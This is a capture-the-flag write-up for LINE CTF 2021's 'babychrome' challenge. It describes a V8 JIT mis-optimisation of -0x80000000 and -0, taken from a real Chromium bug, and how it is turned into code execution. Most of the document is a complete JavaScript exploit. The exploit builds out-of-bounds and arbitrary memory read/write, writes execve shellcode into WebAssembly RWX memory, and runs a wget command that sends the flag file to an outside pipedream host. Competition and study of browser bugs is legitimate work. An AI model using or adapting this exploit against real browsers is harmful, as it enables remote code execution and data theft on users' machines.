# LINE CTF 2021 - Pwn - babychrome

## Solution

Incorrect optimization is performed for the calculation of -0x80000000, which is the minimum value of 32bit signed int, and -0. (Reference: https://bugs.chromium.org/p/chromium/issues/detail?id=1126249)

It seems that the optimizer always determines `v5568` of `jit_func` as `0`, and when `arr.shift ()` is executed for `arr = new Array (v5568)`, `arr.length` becomes `-1`.
OOB read/write is possible by using `arr`, but due to the bad type, it can mainly read and write only integers.
We can get full OOB read / write capability by placing the Packed Double Array after `arr` and overwriting its length with OOB.

Then, by placing the `Uint Array after the` Packed Double Array` and rewriting the pointer to the stored memory, AAR / AAW becomes possible.

Finally, create a WebAssembly module, search the address of the RWX memory from Heap, rewrite it with shellcode, and execute it.

## Exploit Code

```javascript
function jit_func(a, k) {
    let v16213 = 0 * -1;
    var v25608 = -0x80000000;

    if (a) {
        v16213 = -1;
        v25608 = 0;
    }

    var v19229 = ((v16213-v25608) == -0x80000000);

    if (a) {
        v19229 = -1;
    }

    let v5568 = Math.sign(v19229);

    if (v5568 < 0) v5568 = 0;

    const arr = new Array(v5568);
    arr.shift();

    const arr2 = [0.1, 0.2, 0.3];
    const obj = new Uint8Array(v5568 * 0x1200);
    const wm = k ? k() : null;
    const obj2 = new Array(v5568 * 0x4e);

    return [arr, arr2, obj, wm, obj2];
}

const buf = new ArrayBuffer(8);
const view = new DataView(buf);

const d2i = (x) => {
    if (x == null) throw Error("null?");
    view.setFloat64(0, x);
    return (BigInt(view.getUint32(0)) << 32n) + BigInt(view.getUint32(4));
};

const i2d = (x) => {
    if (typeof x !== "bigint") throw Error(`invalid type: ${typeof x}`);
    view.setUint32(0, Number(BigInt.asUintN(32, x >> 32n)));
    view.setUint32(4, Number(BigInt.asUintN(32, x)));
    return view.getFloat64(0);
};

const wr = (w, x) => String(x).padStart(w);

const exploit = ([d, e, view, wasm_module, ...rest]) => {
    d[16] = 128;
    const buf_addr = d2i(e[17]);

    const www = (d2i(e[44]) >> 32n | (d2i(e[45]) & 0xFFFFFFFFn) << 32n);

    e[17] = i2d(www);

    const arr2i = (a) => {
        let x = 0n;
        for (let k = 0; k < 8; ++k) {
            x |= BigInt(a[k]) << BigInt(k * 8);
        }
        return x;
    };
    
    const addr = arr2i(view.slice(24, 32));

    e[17] = i2d(addr - 0x400n);

    nums = []
    for (let i = 0; i < 128; ++i) {
        for (let j = 0; j < 2; ++j) {
            const beg = i * 16 + j * 8;
            const x = arr2i(view.slice(beg, beg + 8));
            nums.push(x);
        }
    }

    let rwx_addr = null;

    for (let i = 0; i < nums.length - 4; ++i) {
        if (
            ((nums[i] & 0xFFFFFFFFn) === 1n) &&
            (nums[i + 1] + 0x1000n === nums[i + 2]) &&
            ((nums[i + 2] & 0xFFFn) === 0n) &&
            ((nums[i + 4] & 0xFFFFFFFFn) === 0x31n)
        ) {
            rwx_addr = nums[i + 1];
            break;
        }
    }

    if (rwx_addr) {
        e[17] = i2d(rwx_addr);
        const shellcode = [72, 185, 136, 119, 102, 85, 68, 51, 34, 17, 104, 45, 99, 0, 0, 72, 184, 47, 98, 105, 110, 47, 115, 104, 0, 80, 72, 137, 231, 106, 0, 81, 72, 141, 71, 8, 80, 87, 72, 137, 230, 49, 210, 184, 59, 0, 0, 0, 15, 5];
        for (let i = 0; i < 8; ++i) {
            shellcode[i + 2] = Number((buf_addr >> BigInt(8 * i)) & 0xFFn);
        }
        for (let i = 0; i < shellcode.length; i++) {
            view[i] = shellcode[i];
        }
        e[17] = i2d(buf_addr);

        const command = `wget "https://en6fa1x8r13pp.x.pipedream.net/$(cat flag)"`;
        for (let i = 0; i < command.length; i++) {
            view[i] = command.charCodeAt(i);
        }

        const wasm_instance = new WebAssembly.Instance(wasm_module);
        const a = new String('helloworld');
        const wasm_func = wasm_instance.exports.a;

        wasm_func();
    }
};

const wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
    0x00, 0x00, 0x41, 0x00, 0x0b
]);

jit_func(false);
jit_func(true);

for (let i = 0; i < 0x10000; i++) {
    jit_func(true);
}

function gc() {
    for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x10000); }
}
gc();

exploit(jit_func(false, () => new WebAssembly.Module(wasm_code)));
```